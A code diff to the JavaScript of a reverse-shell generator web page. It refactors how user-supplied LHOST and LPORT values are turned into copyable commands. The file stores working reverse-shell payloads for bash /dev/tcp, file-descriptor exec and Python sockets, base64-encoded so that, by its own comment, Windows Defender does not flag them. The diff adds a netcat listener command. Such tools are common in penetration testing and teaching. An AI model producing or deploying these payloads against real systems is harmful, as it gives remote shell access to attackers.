@@ -1,52 +1,37 @@
 
-const STORAGE_KEY = 'ATTACKER';
+const STORAGE_KEY = 'REVSHELL_ENV'; // .lhost, .lport
 
 $(function () {
-  const revShell = new RevShell('#revshList');
+  const revShell = new RevShell('#revshListener', '#revshList', {
+    'LHOST': '#revshInputLHOST',
+    'LPORT': '#revshInputLPORT',
+    'SUBMIT': '#revshInputSubmit',
+  });
 
   // Get LHOST and LPORT info from session storage if exists.
   let listenInfo = window.sessionStorage.getItem(STORAGE_KEY);
   listenInfo = JSON.parse(listenInfo);
   const lhost = (listenInfo && listenInfo.lhost) || '10.0.0.1';
   const lport = (listenInfo && listenInfo.lport) || '4444';
-  revShell.drawList(lhost, lport);
-
-  // Form input default value.
-  $('#revshInputLHOST').val(lhost);
-  $('#revshInputLPORT').val(lport);
-
-  // Submit when press enter key.
-  $('#revshInputLHOST').keypress(function (e) {
-    if (e.which === 13) {
-      submit();
-      return false;
-    }
-  });
-  $('#revshInputLPORT').keypress(function (e) {
-    if (e.which === 13) {
-      submit();
-      return false;
-    }
-  });
-
-  // When click submit button
-  $('#inputSubmit').click(function () {
-    const lhost = $('#revshInputLHOST').val().toString();
-    const lport = $('#revshInputLPORT').val().toString();
-    if (lhost !== "" && lport !== "") {
-      $('#revshList').empty();
-      revShell.drawList(lhost, lport);
-      // Set LHOST and LPORT info into session storage.
-      const listenInfo = {'lhost': lhost, 'lport': lport};
-      window.sessionStorage.setItem(STORAGE_KEY, JSON.stringify(listenInfo));
-    }
-  });
+  revShell.setup(lhost, lport);
+  revShell.draw(lhost, lport);
 });
 
 
 class RevShell {
-  constructor(targetCSSSelector) {
-    this.targetCSSSelector = targetCSSSelector // 例：'#revshList'
+  constructor(targetListenCSSSelector, targetRevshCSSSelector, inputCSSSelectors) {
+    this.targetListenCSSSelector = targetListenCSSSelector // ListenリストのCSSセレクタ
+    this.targetRevshCSSSelector  = targetRevshCSSSelector  // ConnectbackリストのCSSセレクタ
+    this.inputLhostCSSSelector = inputCSSSelectors.LHOST   // 入力フォームのLHOSTテキストのCSSセレクタ
+    this.inputLportCSSSelector = inputCSSSelectors.LPORT   // 入力フォームのLPORTテキストのCSSセレクタ
+    this.submitCSSSelector     = inputCSSSelectors.SUBMIT  // 入力フォームのSubmitボタンのCSSセレクタ
+
+    // 1. Listen
+    this.listeners = [
+      {'title': 'netcat', 'cmd': 'nc -lnvp {0}'},
+    ]
+
+    // 2. Connect back
     // ローカル開発時にWindows Definderに検知されないようにBase64で保存すること。
     // {0}はIPアドレス、{1}はポート番号に置換される。
     this.reverseShells = {
@@ -55,7 +40,7 @@ class RevShell {
         'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY='
       ],
       "Bash (Base64)": [
-        {'revsh': 'YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=', 'cmd': 'echo {0} | base64 -d | sh'}
+        {'revsh': 'YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=', 'cmd': 'echo {0} | base64 -d | bash'}
       ],
       "Python": [
         'cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc='
@@ -131,8 +116,71 @@ class RevShell {
     }
   }
 
+  setup(lhost, lport) {
+    // Form input default value.
+    $(this.inputLhostCSSSelector).val(lhost);
+    $(this.inputLportCSSSelector).val(lport);
+
+    // Submit when press enter key.
+    $(this.inputLhostCSSSelector).keypress(function (e) {
+      if (e.which === 13) { submit(); return false; }
+    });
+    $(this.inputLportCSSSelector).keypress(function (e) {
+      if (e.which === 13) { submit(); return false; }
+    });
+
+    // Submit when click button
+    $(this.submitCSSSelector).click(submit);
+
+    self = this;
+    function submit() {
+      const lhost = $(self.inputLhostCSSSelector).val().toString();
+      const lport = $(self.inputLportCSSSelector).val().toString();
+      if (lhost !== "" && lport !== "") {
+        // Clear
+        $(self.targetListenCSSSelector).empty();
+        $(self.targetRevshCSSSelector).empty();
+        // Create
+        self.draw(lhost, lport);
+        // Set LHOST and LPORT info into session storage.
+        const listenInfo = {'lhost': lhost, 'lport': lport};
+        window.sessionStorage.setItem(STORAGE_KEY, JSON.stringify(listenInfo));
+      }
+    }
+  }
+
+  draw(lhost, lport) {
+    this.drawListener(lport);
+    this.drawList(lhost, lport);
+  }
+
+  drawListener(lport) {
+    $('.revsh_lport').text(lport);
+  }
+
   drawList(lhost, lport) {
-    const languages = Object.keys(this.reverseShells)
+    // 1. Listen
+    for (let i = 0; i < this.listeners.length; i++) {
+      const listener = this.listeners[i];
+      let title = listener.title;
+      let cmd = listener.cmd;
+      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
+      // Template
+      $(this.targetListenCSSSelector).append(`
+        <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+          <div class="ms-2 me-auto" style="width: 80%">
+            <div class="fw-bold">${title}</div>
+            <code class="copy_target">${cmd}</code>
+          </div>
+          <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">
+            Copy
+          </button>
+        </li>
+        `);
+    }
+
+    // 2. Connect back
+    const languages = Object.keys(this.reverseShells);
     for (let i = 0; i < languages.length; i++) {
       const language = languages[i];
       for (let j = 0; j < this.reverseShells[language].length; j++) {
@@ -156,58 +204,59 @@ class RevShell {
         //console.log(reverseShell);
   
         // Template
-        $(this.targetCSSSelector).append(`
-        <li id="revsh_${i}_${j}" class="list-group-item d-flex justify-content-between align-items-start">
+        $(this.targetRevshCSSSelector).append(`
+        <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
           <div class="ms-2 me-auto" style="width: 80%">
             <div class="fw-bold">${language}</div>
             <code class="copy_target">${reverseShell}</code>
           </div>
-          <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top"
-            title="Copy to clipboard" id="copy-input">
+          <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">
             Copy
           </button>
         </li>
         `);
-  
-        // Reverse Shell
-        const $revsh = $(`#revsh_${i}_${j}`);
-        $revsh.mouseup(function () {
-          if (String(document.getSelection()).length !== 0) {
-            return false; // 文字列範囲選択中はClickを発火させない
-          }
-          $revsh.find('.copy_input').trigger('click'); // 枠内をクリックするとコピー押下する
-          return false;
-        });
-  
-        // Copy Button
-        const $copy_input = $revsh.find('.copy_input');
-        $copy_input.click(function () {
-          // 対象の文字列をinputに格納してからコピーする
-          const text = $revsh.find('.copy_target').text();
-          $('#input').val(text);
-          var copyText = document.querySelector("#input");
-          copyText.select();
-          document.execCommand("copy");
-          // コピー完了したらツールチップ表示
-          $(this).tooltip('show');
-          // コピー完了したら強調表示
-          $('.my-active').removeClass('my-active');
-          $revsh.addClass('my-active');
-          return false;
-        });
-        //「Copy」ボタンのツールチップ（補足説明）の設定
-        $copy_input
-          .tooltip({
-            trigger: 'manual'
-          })
-          // tooltip表示後の動作を設定
-          .on('shown.bs.tooltip', function () {
-            setTimeout((function () {
-              $(this).tooltip('hide');
-            }).bind(this), 1500);
-          });
       }
     }
+
+    // クリック時の処理
+    $('.copy_article').each(function (index, element) {
+      const $revsh = $(element);
+      $revsh.mouseup(function () {
+        if (String(document.getSelection()).length !== 0) {
+          return false; // 文字列範囲選択中はClickを発火させない
+        }
+        $revsh.find('.copy_input').trigger('click'); // 枠内をクリックするとコピー押下する
+        return false;
+      });
+
+      // Copy Button
+      const $copy_input = $revsh.find('.copy_input');
+      $copy_input.click(function () {
+        // 対象の文字列をinputに格納してからコピーする
+        const text = $revsh.find('.copy_target').text();
+        $('#input').val(text);
+        var copyText = document.querySelector("#input");
+        copyText.select();
+        document.execCommand("copy");
+        // コピー完了したらツールチップ表示
+        $(this).tooltip('show');
+        // コピー完了したら強調表示
+        $('.my-active').removeClass('my-active');
+        $revsh.addClass('my-active');
+        return false;
+      });
+      //「Copy」ボタンのツールチップ（補足説明）の設定
+      $copy_input
+        .tooltip({
+          trigger: 'manual'
+        })
+        // tooltip表示後の動作を設定
+        .on('shown.bs.tooltip', function () {
+          setTimeout((function () {
+            $(this).tooltip('hide');
+          }).bind(this), 1500);
+        });
+    });
   }
 }
 
